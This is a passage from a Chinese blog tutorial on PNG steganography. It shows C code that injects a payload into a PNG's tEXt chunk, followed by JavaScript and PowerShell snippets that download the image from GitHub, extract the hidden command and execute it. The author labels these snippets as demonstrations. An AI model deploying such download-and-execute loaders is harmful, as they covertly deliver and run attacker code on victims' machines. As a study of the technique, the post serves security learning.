                 <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                                    fwrite(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fpnew);</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                                    fseek(fpnew,<span class="number">-4</span>,SEEK_CUR);</div><div class="line">                                    j=<span class="number">1</span>;</div><div class="line">                        &#125;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkLen: %10d              \n"</span>,ChunkLen);</div><div class="line">                        crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);</div><div class="line">                        <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                                    <span class="keyword">if</span>(j==<span class="number">0</span>)</div><div class="line">                                                fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                        &#125;</div><div class="line">                        ChunkLen=ftell(fp);</div><div class="line">                        <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                        </div><div class="line">                                    <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">            &#125;</div><div class="line">            AddPayload(fpnew);</div><div class="line">            fwrite(IEND,<span class="number">12</span>,<span class="number">1</span>,fpnew);</div><div class="line">            fclose(fp);</div><div class="line">            fclose(fpnew);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用check.cpp对其进行校验，如图，校验成功</p>
<h2 id="0x06-读取payload并执行"><a href="#0x06-读取payload并执行" class="headerlink" title="0x06-读取payload并执行"></a>0x06-读取payload并执行</h2><p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
<ol>
<li>javascript</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">h = newActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</div><div class="line">h.SetTimeouts(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">h.Open(<span class="string">"GET"</span>,<span class="string">"https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png"</span>,<span class="literal">false</span>);</div><div class="line">h.Send();</div><div class="line">Data = h.ResponseText;</div><div class="line">x=Data.indexOf(<span class="string">"tEXt"</span>);</div><div class="line">y=Data.indexOf(<span class="string">"IEND"</span>);</div><div class="line">str=Data.substring(x+<span class="number">4</span>,y<span class="number">-8</span>);</div><div class="line">newActiveXObject(<span class="string">"WScript.Shell"</span>).Run(str);</div></pre></td></tr></table></figure>
<ol>
<li>powershell</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$url</span> = <span class="string">'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'</span></div><div class="line"><span class="variable">$request</span> = <span class="built_in">New-Object</span> System.Net.WebCLient</div><div class="line"><span class="variable">$bytes</span> = <span class="variable">$request</span>.DownloadString(<span class="variable">$url</span>)</div><div class="line"><span class="variable">$x</span>=<span class="variable">$bytes</span>.indexof(<span class="string">"tEXt"</span>)</div><div class="line"><span class="variable">$y</span>=<span class="variable">$bytes</span>.indexof(<span class="string">"IEND"</span>)</div><div class="line"><span class="variable">$str</span>=<span class="variable">$bytes</span>.Substring(<span class="variable">$x</span>+<span class="number">4</span>,<span class="variable">$y</span>-<span class="variable">$x</span>-<span class="number">12</span>)</div><div class="line"><span class="built_in">Start-Process</span> -FilePath <span class="variable">$str</span></div></pre></td></tr></table></figure>
<p>注:这里给出两种方法，仅作演示</p>

      
      
        <div class="page-reward">
          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">赏</a></p>
          <div class="hide_box"></div>
          <div class="shang_box">
            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()" title="关闭">×</a>
            <div class="shang_tit">
              <p>纯属好玩</p>
            </div>
            <div class="shang_payimg">
              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
            </div>
              <div class="pay_explain">点击下方的图片，扫码打赏，你说多少就多少</div>
            <div class="shang_payselect">
              
                <div class="pay_item checked" data-id="alipay">
                  <span class="radiobox"></span>
                  <span class="pay_logo"><img src="/img/123.png" alt="支付宝" /></span>
                </div>
              
              
                <div class="pay_item" data-id="wechat">
                  <span class="radiobox"></span>
                  <span class="pay_logo"><img src="/img/wc.png" alt="微信" /></span>
                </div>
              
            </div>
            <div class="shang_info">
              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
            </div>
          </div>
        </div>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
        <script type="text/javascript">
          $(".pay_item").click(function(){
            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
            var dataid=$(this).attr('data-id');
            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
          });
          function dashangToggle(){
            $(".hide_box").fadeToggle();
            $(".shang_box").fadeToggle();
          }
        </script>
      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2017/10/29/PNG在隐写中的应用/">PNG在隐写中的应用</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Peter pan 的个人博客">Peter pan</a></p>
        <p><span>发布时间:</span>2017年10月29日 - 15时03分</p>
        <p><span>最后更新:</span>2017年11月04日 - 17时54分</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2017/10/29/PNG在隐写中的应用/" title="PNG在隐写中的应用">http://yoursite.com/2017/10/29/PNG在隐写中的应用/</a>
            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/10/29/PNG在隐写中的应用/　　作者: Peter pan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script src="/js/clipboard.min.js"></script>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



<nav id="article-nav">
  
    <a href="/2017/10/30/CTF-图像学基础/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption"><</strong>
      <div class="article-nav-title">
        
          CTF-图像学基础
        
      </div>
    </a>
  
  
    <a href="/2017/10/28/CTF-密码学/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">CTF-密码学</div>
      <strong class="article-nav-caption">></strong>
    </a>
  
</nav>

  
</article>

    <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#00X0-前言"><span class="toc-number">1.</span> <span class="toc-text">00X0-前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-PNG文件格式"><span class="toc-number">2.</span> <span class="toc-text">0X01-PNG文件格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-实例图片分析"><span class="toc-number">3.</span> <span class="toc-text">0x02-实例图片分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-编写程序分析文件格式"><span class="toc-number">4.</span> <span class="toc-text">0x03-编写程序分析文件格式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-去除多余数据"><span class="toc-number">5.</span> <span class="toc-text">0x04-去除多余数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-写入Payload"><span class="toc-number">6.</span> <span class="toc-text">0x05-写入Payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-读取payload并执行"><span class="toc-number">7.</span> <span class="toc-text">0x06-读取payload并执行</span></a></li></ol>
</div>
<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script>
    var valueHide = "隐藏目录";
    var valueShow = "显示目录";

    if ($(".left-col").is(":hidden")) {
        $("#tocButton").attr("value", valueShow);
    }
    $("#tocButton").click(function() {
        if ($("#toc").is(":hidden")) {
            $("#tocButton").attr("value", valueHide);
            $("#toc").slideDown(320);
        }
        else {
            $("#tocButton").attr("value", valueShow);
            $("#toc").slideUp(350);
        }
    })
    if ($(".toc").length < 1) {
        $("#toc, #tocButton").hide();
    }
</script>





<div class="bdsharebuttonbox">
	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
</div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>




    
        <section id="comments">
  <div id="disqus_thread"></div>
    <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'peterpan980927'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>
    



    <div class="scroll" id="post-nav-button">
        
            <a href="/2017/10/30/CTF-图像学基础/" title="上一篇: CTF-图像学基础">
                <i class="fa fa-angle-left"></i>
            </a>
        
        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
        
            <a href="/2017/10/28/CTF-密码学/" title="下一篇: CTF-密码学">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>
    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/iOS多线程之NSOperation/">iOS多线程之NSOperation</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/06/Python-函数式编程/">Python-函数式编程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/05/iOS第三方和权限问题/">iOS第三方和权限问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/01/CTF-MISC-二/">CTF-MISC(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/Python-Review/">Python3-Review</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/PIL学习-一/">PIL学习(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/30/CTF-图像学基础/">CTF-图像学基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/29/PNG在隐写中的应用/">PNG在隐写中的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/28/CTF-密码学/">CTF-密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/23/大话CTF/">大话CTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/15/TCP-IP-四/">TCP/IP(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/07/GFW-中间人攻击/">GFW&中间人攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/05/iOS多线程之GCD/">iOS多线程之GCD</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/iOS多线程/">iOS多线程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/25/CTF-SQL注入/">CTF-SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/CTF-安全杂项/">CTF-MISC</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/17/CTF-隐写术/">CTF-信息隐藏技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/Foundation框架/">Foundation框架</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/03/TCP-IP-三/">TCP/IP(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/iOS沙盒与模态/">iOS沙盒与模态</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/28/Linux运维学习Day6/">Linux运维学习Day6</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/27/TCP-IP-二/">TCP/IP(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/24/地狱少女/">地獄少女</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/24/OSI模型初探/">TCP/IP(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/16/DNS相关/">DNS相关</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/计算机网络硬件/">计算机网络硬件</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/Linux运维学习Day5/">Linux运维学习Day5</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/Linux运维学习Day4/">Linux运维学习Day4</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/Linux运维学习Day3/">Linux运维学习Day3</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/Linux运维学习Day2/">Linux运维学习Day2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/15/Linux运维学习Day1/">Linux运维学习Day1</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/13/缓存服务器和一致性哈希/">缓存服务器和一致性哈希</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/13/iOS-UI-启动原理和导航控制器/">iOS-UI 启动原理和导航控制器</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/26/iOS成员变量和属性的关系/">iOS成员变量和属性的关系</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/26/ARC与分类/">ARC与分类</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/24/内存管理/">内存管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/21/OC特有语法/">OC特有语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/20/Xcode基本调试/">Xcode基本调试</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/15/iOS-UI基础-七/">iOS-UI基础(七)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/15/七牛图片自动上传/">七牛图片自动上传</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/CPU对于内存的读写/">CPU对于内存的读写</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/11/iOS-UI学习-六/">iOS-UI学习(六)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/03/iOS-UI学习-五/">iOS-UI学习(五)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/26/Web基础/">Web基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/iOS-UI学习-四/">iOS-UI学习(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/22/Linux进程/">Linux进程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/18/jupyter笔记本基本使用/">jupyter笔记本基本使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/18/iOS-UI学习-三/">iOS-UI学习(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/iOS-UI学习-二/">iOS-UI学习(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/iOS-UI学习/">iOS-UI学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/网络爬虫-二/">网络爬虫(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/网络爬虫/">网络爬虫</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/RSA密钥生成的过程-数学证明/">RSA密钥生成的过程(数学证明)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/土家购农村电商爬虫代码示例/">土家购农村电商爬虫代码示例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/多终端同步hexo博客/">多终端同步hexo博客</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/hello-world/">页面教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/秒速五厘米/">秒速五厘米</a></li></ul>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
    <script>
        $(".post-list").addClass("toc-article");
        $(".post-list-item a").attr("target","_blank");
        $("#post-nav-button > a:nth-child(2)").click(function() {
            $(".fa-bars, .fa-times").toggle();
            $(".post-list").toggle(300);
            if ($(".toc").length > 0) {
                $("#toc, #tocButton").toggle(200, function() {
                    if ($(".switch-area").is(":visible")) {
                        $("#tocButton").attr("value", valueHide);
                        }
                    })
            }
            else {
            }
        })
    </script>



    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                &copy; 2017 Peter pan
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" >訪問者の量: 
                            <span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>, </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit">読書の量: 
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>

    </div>
    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>

    <script>
        $(document).ready(function() {
            var backgroundnum = 24;
            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    $(document).ready(function() {
        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(

            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>